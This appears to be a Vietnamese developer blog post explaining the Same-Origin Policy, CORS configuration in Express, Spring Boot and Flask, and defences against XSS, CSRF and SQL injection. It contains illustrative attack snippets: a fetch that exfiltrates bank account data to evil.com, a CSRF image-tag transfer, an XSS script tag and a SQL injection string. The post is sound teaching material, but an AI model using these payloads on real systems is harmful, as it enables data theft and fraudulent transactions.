---
title: "CORS và Các Vấn đề Bảo Mật trong Web Development"
date: 2025-01-15
lastmod: 2025-01-15
draft: false
author: "Nguyễn Minh Long"
description: "Tìm hiểu về CORS, Same-Origin Policy, và các vấn đề bảo mật trong web development: cách xử lý CORS, best practices, và các lỗ hổng bảo mật phổ biến."
tags:
  - JavaScript
  - Networking
  - Security
  - Web Development
categories:
  - "Lập trình mạng"
featuredImage: "/images/posts/networking/cors-security.jpg"
featuredImagePreview: "/images/posts/networking/cors-security-preview.jpg"
toc: true
ShowToc: true
math: false
code: true
---

## Giới thiệu

Khi phát triển web application, bạn sẽ gặp phải lỗi **CORS (Cross-Origin Resource Sharing)** khi frontend cố gắng gọi API từ domain khác. Đây là một cơ chế bảo mật quan trọng của trình duyệt.

![CORS và Bảo mật Web](/images/posts/networking/cors-security.jpg)

*CORS - Cơ chế bảo mật quan trọng trong web development*

Bài viết này sẽ giới thiệu:

- **Same-Origin Policy**: Chính sách bảo mật cơ bản của trình duyệt
- **CORS là gì?**: Cơ chế cho phép cross-origin requests
- **Cách xử lý CORS**: Cấu hình server và client
- **Best practices**: Bảo mật và hiệu năng
- **Các vấn đề bảo mật phổ biến**: XSS, CSRF, và cách phòng chống

## Same-Origin Policy là gì?

**Same-Origin Policy (SOP)** là chính sách bảo mật của trình duyệt, ngăn chặn JavaScript từ một origin truy cập tài nguyên từ origin khác.

### Origin là gì?

**Origin** được xác định bởi 3 thành phần:

- **Protocol** (http/https)
- **Domain** (example.com)
- **Port** (80, 443, 3000, ...)

**Ví dụ:**

```
https://example.com:443  → Origin: https://example.com:443
http://example.com:80    → Origin: http://example.com:80 (KHÁC origin trên)
https://api.example.com  → Origin: https://api.example.com (KHÁC origin đầu)
https://example.com:3000 → Origin: https://example.com:3000 (KHÁC origin đầu)
```

### Tại sao cần Same-Origin Policy?

**Mục đích bảo mật:**

- ✅ Ngăn chặn **XSS (Cross-Site Scripting)**: Script độc hại không thể đọc dữ liệu từ domain khác
- ✅ Ngăn chặn **CSRF (Cross-Site Request Forgery)**: Không thể gửi request giả mạo từ domain khác
- ✅ Bảo vệ **cookies và session**: Không bị đánh cắp bởi domain khác

**Ví dụ nguy hiểm nếu không có SOP:**

```javascript
// Trang web độc hại (evil.com) cố gắng đọc dữ liệu từ bank.com
fetch('https://bank.com/api/account')
  .then(res => res.json())
  .then(data => {
    // Gửi dữ liệu tài khoản về server độc hại
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

**Nhờ SOP, trình duyệt sẽ chặn request này!**

## CORS là gì?

**CORS (Cross-Origin Resource Sharing)** là cơ chế cho phép server **cho phép** trình duyệt thực hiện cross-origin requests một cách an toàn.

![CORS Mechanism](/images/posts/networking/cors-mechanism.jpg)

*CORS cho phép cross-origin requests một cách an toàn*

### CORS hoạt động như thế nào?

Khi trình duyệt gửi **cross-origin request**, nó sẽ:

1. **Preflight Request** (OPTIONS): Kiểm tra xem server có cho phép không
2. **Actual Request**: Gửi request thực sự nếu được phép

**Ví dụ:**

```javascript
// Frontend: https://myapp.com
fetch('https://api.example.com/users', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
.then(res => res.json())
.then(data => console.log(data));
```

**Trình duyệt sẽ gửi:**

1. **Preflight (OPTIONS):**
   ```
   OPTIONS /users HTTP/1.1
   Origin: https://myapp.com
   Access-Control-Request-Method: GET
   Access-Control-Request-Headers: Content-Type
   ```

2. **Server phải trả về:**
   ```
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://myapp.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type
   Access-Control-Max-Age: 86400
   ```

3. **Actual Request (GET):**
   ```
   GET /users HTTP/1.1
   Origin: https://myapp.com
   ```

## Cách xử lý CORS

### 1. Cấu hình CORS trên Server

#### Node.js (Express)

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// Cho phép tất cả origins (KHÔNG nên dùng trong production)
app.use(cors());

// Hoặc cấu hình cụ thể
app.use(cors({
  origin: 'https://myapp.com',           // Chỉ cho phép domain này
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true                       // Cho phép gửi cookies
}));

// Hoặc cấu hình thủ công
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  // Xử lý preflight request
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});

app.get('/api/users', (req, res) => {
  res.json({ users: [] });
});

app.listen(3000);
```

#### Java (Spring Boot)

```java
@Configuration
public class CorsConfig {
    
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://myapp.com")
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("Content-Type", "Authorization")
                    .allowCredentials(true)
                    .maxAge(3600);
            }
        };
    }
}
```

#### Python (Flask)

```python
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)

# Cho phép tất cả origins
CORS(app)

# Hoặc cấu hình cụ thể
CORS(app, 
     origins=["https://myapp.com"],
     methods=["GET", "POST", "PUT", "DELETE"],
     allow_headers=["Content-Type", "Authorization"],
     supports_credentials=True)

@app.route('/api/users')
def get_users():
    return {'users': []}
```

### 2. CORS Headers

**Các headers quan trọng:**

- **`Access-Control-Allow-Origin`**: Domain được phép truy cập
  - `*`: Cho phép tất cả (không dùng với credentials)
  - `https://myapp.com`: Chỉ cho phép domain cụ thể

- **`Access-Control-Allow-Methods`**: Methods được phép (GET, POST, PUT, DELETE, ...)

- **`Access-Control-Allow-Headers`**: Headers được phép (Content-Type, Authorization, ...)

- **`Access-Control-Allow-Credentials`**: Cho phép gửi cookies (true/false)

- **`Access-Control-Max-Age`**: Thời gian cache preflight request (giây)

### 3. Simple Requests vs Preflight Requests

**Simple Requests** (không cần preflight):

- Method: GET, HEAD, POST
- Headers: Chỉ các headers đơn giản (Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data)
- Không có custom headers

**Preflight Requests** (cần OPTIONS trước):

- Method: PUT, DELETE, PATCH, ...
- Headers: Custom headers (Authorization, X-Custom-Header, ...)
- Content-Type: application/json

**Ví dụ Simple Request:**

```javascript
// Không cần preflight
fetch('https://api.example.com/users');
```

**Ví dụ Preflight Request:**

```javascript
// Cần preflight vì có custom header
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ name: 'Minh Long' })
});
```

## Best Practices

### 1. Không dùng `Access-Control-Allow-Origin: *` với Credentials

**❌ SAI:**

```javascript
// Server
res.header('Access-Control-Allow-Origin', '*');
res.header('Access-Control-Allow-Credentials', 'true'); // LỖI!
```

**✅ ĐÚNG:**

```javascript
// Server
res.header('Access-Control-Allow-Origin', 'https://myapp.com');
res.header('Access-Control-Allow-Credentials', 'true');
```

### 2. Whitelist Origins

**❌ SAI:**

```javascript
// Cho phép tất cả
app.use(cors());
```

**✅ ĐÚNG:**

```javascript
// Chỉ cho phép domains cụ thể
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'http://localhost:3000' // Chỉ cho development
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

### 3. Cache Preflight Requests

```javascript
// Cache preflight trong 1 giờ
res.header('Access-Control-Max-Age', '3600');
```

### 4. Chỉ cho phép Methods cần thiết

```javascript
// Chỉ cho phép GET và POST
res.header('Access-Control-Allow-Methods', 'GET, POST');
```

## Các Vấn đề Bảo mật Phổ biến

### 1. XSS (Cross-Site Scripting)

**XSS** là lỗ hổng cho phép attacker chèn script độc hại vào trang web.

**Ví dụ:**

```javascript
// ❌ NGUY HIỂM: Hiển thị user input trực tiếp
document.getElementById('comment').innerHTML = userComment;
// Nếu userComment = "<script>alert('XSS')</script>", script sẽ chạy!

// ✅ AN TOÀN: Escape HTML
document.getElementById('comment').textContent = userComment;
```

**Cách phòng chống:**

- ✅ **Escape HTML**: Dùng `textContent` thay vì `innerHTML`
- ✅ **Content Security Policy (CSP)**: Giới hạn nguồn script
- ✅ **Validate input**: Kiểm tra và sanitize user input
- ✅ **Use frameworks**: React, Vue tự động escape

### 2. CSRF (Cross-Site Request Forgery)

**CSRF** là lỗ hổng cho phép attacker thực hiện request giả mạo từ domain khác.

**Ví dụ:**

```html
<!-- Trang web độc hại (evil.com) -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Nếu user đã đăng nhập bank.com, request sẽ được gửi! -->
```

**Cách phòng chống:**

- ✅ **CSRF Tokens**: Server tạo token, client gửi kèm request
- ✅ **SameSite Cookies**: `Set-Cookie: session=xxx; SameSite=Strict`
- ✅ **Verify Origin/Referer**: Kiểm tra header Origin/Referer
- ✅ **Double Submit Cookie**: So sánh token trong cookie và form

**Ví dụ CSRF Token:**

```javascript
// Server tạo token
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken, { httpOnly: false, sameSite: 'strict' });

// Client gửi token trong header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf-token')
  },
  body: JSON.stringify({ to: 'user123', amount: 100 })
});
```

### 3. SQL Injection

**SQL Injection** là lỗ hổng cho phép attacker chèn SQL code vào query.

**❌ NGUY HIỂM:**

```javascript
// Không dùng parameterized queries
const query = `SELECT * FROM users WHERE username = '${username}'`;
// Nếu username = "admin' OR '1'='1", query sẽ trả về tất cả users!
```

**✅ AN TOÀN:**

```javascript
// Dùng parameterized queries
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);
```

### 4. Sensitive Data Exposure

**Không lưu sensitive data ở client:**

- ❌ **SAI**: Lưu password, API keys trong localStorage
- ✅ **ĐÚNG**: Lưu trong httpOnly cookies hoặc server-side

**Ví dụ:**

```javascript
// ❌ NGUY HIỂM
localStorage.setItem('apiKey', 'secret-key-123');
localStorage.setItem('password', 'mypassword');

// ✅ AN TOÀN
// Chỉ lưu non-sensitive data
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'vi');
```

## Kết luận

**Tóm tắt:**

- ✅ **Same-Origin Policy**: Chính sách bảo mật cơ bản của trình duyệt
- ✅ **CORS**: Cơ chế cho phép cross-origin requests an toàn
- ✅ **Cấu hình CORS**: Whitelist origins, chỉ cho phép methods/headers cần thiết
- ✅ **Bảo mật**: Phòng chống XSS, CSRF, SQL Injection, và sensitive data exposure

**Best Practices:**

1. **Luôn whitelist origins** thay vì dùng `*`
2. **Không dùng `*` với credentials**
3. **Cache preflight requests** để tăng hiệu năng
4. **Validate và sanitize** tất cả user input
5. **Dùng CSRF tokens** cho các request quan trọng
6. **Không lưu sensitive data** ở client

**Tài liệu tham khảo:**

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CORS in Express](https://expressjs.com/en/resources/middleware/cors.html)

